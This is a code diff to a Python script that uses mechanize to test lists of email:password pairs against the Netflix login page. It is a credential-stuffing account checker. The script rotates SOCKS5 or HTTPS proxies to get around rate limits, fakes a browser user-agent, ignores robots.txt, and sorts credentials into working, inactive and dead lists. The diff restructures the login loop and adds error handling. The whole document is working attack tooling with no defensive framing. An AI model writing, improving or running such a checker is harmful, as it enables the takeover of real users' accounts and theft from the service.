@@ -5,7 +5,6 @@ from __future__ import division
 
 from os import path
 from random import randint
-from time import sleep
 
 from mechanize import Browser
 from progressbar import ProgressBar
@@ -21,73 +20,73 @@ br = Browser()
 def test_account(email, password, type_proxy):
     global br, current_proxy, response
 
+    login_url = "https://www.netflix.com/login"
     logout_url = "https://www.netflix.com/SignOut?lnkctr=mL"
     page = "Sorry, we are unable to process your request."
     while page.find("Sorry, we are unable to process your request.") != -1:
-        try:
-            proxies()
-            login_url = "https://www.netflix.com/login"
-            br.set_handle_equiv(True)
-            br.set_handle_redirect(True)
-            br.set_handle_referer(True)
-            br.set_handle_robots(False)
-            br.addheaders = [("User-agent", "Firefox")]
-            if current_proxy != "":
-                if type_proxy != "HTTP":
-                    br.set_proxies({"socks5": current_proxy})
-                else:
-                    br.set_proxies({"HTTP": current_proxy})
-            else:
-                br.set_proxies()
-            br.open(login_url)
-            br.select_form(nr=0)
-            br.form["userLoginId"] = email
-            br.form["password"] = password
-            response = br.submit()
+        proxies()
 
-            if response.code == 200:
-                page = response.read().decode()
-                if page.find("Sorry, we are unable to process your request.") != -1:
-                    pass
-                elif response.geturl().find("browse") != -1:
-                    br.open(logout_url)
-                    working.append(email + ":" + password + "\n")
-                elif page.find("Finish Sign-up") != -1:
-                    br.open(logout_url)
-                    inactive.append(email + ":" + password)
-                elif response.geturl().find("getstarted") != -1:
-                    br.open(logout_url)
-                    inactive.append(email + ":" + password)
-                elif response.code == 500:
-                    error_file = open("error_log.txt", "a+", encoding="utf-8")
-                    error_file.write("500-Bad Gateway: currentProxy\n")
-                    error_file.close()
-                elif page.find("Incorrect password") != -1:
-                    dead.append(email + ":" + password)
-                elif page.find("find an account with this email address.") != -1:
-                    dead.append(email + ":" + password)
-                elif page.find("Please try again later.") != -1:
-                    error_file = open("error_log.txt", "a+", encoding="utf-8")
-                    error_file.write("Too many request, need to use a proxy\n")
-                    error_file.close()
-                else:
-                    print("Unknown Error. (7)")
-                    error_file = open("error_log.txt", "a+", encoding="utf-8")
-                    error_file.write(response.geturl() + "\n" + page)
-                    error_file.close()
+        br.set_handle_equiv(True)
+        br.set_handle_redirect(True)
+        br.set_handle_referer(True)
+        br.set_handle_robots(False)
+
+        br.addheaders = [('User-agent', 'Mozilla/5.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)')]
+        if current_proxy != "":
+            if type_proxy != "https":
+                br.set_proxies({"socks5": current_proxy})
             else:
-                print("Error:", str(response.code), "Trying again.")
-        except Exception as e:
-            print("\n\n", e)
-            exit(1)
+                br.set_proxies({"https": current_proxy})
         else:
-            if response.geturl().find("getstarted") != -1:
-                print(response.geturl().find("getstarted"))
-                error_file = open("error_log.txt", "a+", encoding="utf-8")
-                error_file.write(response.geturl() + "\n" + page)
-                error_file.close()
+            br.set_proxies()
+
+        try:
+            br.open(login_url)
+        except Exception as e:
+            print("\n", e)
+            exit(1)
+
+        br.select_form(nr=0)
+        br.form["userLoginId"] = email
+        br.form["password"] = password
+        response = br.submit()
+
+        if response.code == 200:
+            page = response.read().decode()
+            if page.find("Sorry, we are unable to process your request.") != -1:
+                pass
+            elif response.geturl().find("browse") != -1:
                 br.open(logout_url)
-                sleep(3)
+                working.append(email + ":" + password + "\n")
+            elif page.find("Finish Sign-up") != -1:
+                br.open(logout_url)
+                inactive.append(email + ":" + password)
+            elif response.geturl().find("getstarted") != -1:
+                br.open(logout_url)
+                inactive.append(email + ":" + password)
+            elif response.code == 500:
+                error_file = open("error_log.txt", "a+", encoding="utf-8")
+                error_file.write("500-Bad Gateway: currentProxy\n")
+                error_file.close()
+            elif page.find("Incorrect password") != -1:
+                dead.append(email + ":" + password)
+            elif page.find("find an account with this email address.") != -1:
+                dead.append(email + ":" + password)
+            elif page.find("Please try again later.") != -1:
+                error_file = open("error_log.txt", "a+", encoding="utf-8")
+                error_file.write("Too many request, need to use a proxy\n")
+                error_file.close()
+            elif page.find("Please try again in a few minutes.") != -1:
+                error_file = open("error_log.txt", "a+", encoding="utf-8")
+                error_file.write("Netflix: we are having technical difficulties and are actively working on a fix\n")
+                error_file.close()
+            else:
+                print("\n", response.geturl(), "- Unknown Error.")
+                error_file = open("error_log.txt", "a+", encoding="utf-8")
+                error_file.write(response.geturl() + " - Unknown Error.")
+                error_file.close()
+        else:
+            print("Error:", str(response.code), "Trying again.")
 
 
 def write_to_file():
@@ -167,6 +166,7 @@ def main():
         print("\n", e)
         print("An error occurred.. Saving progress..")
         write_to_file()
+        exit(1)
 
 
 if __name__ == "__main__":
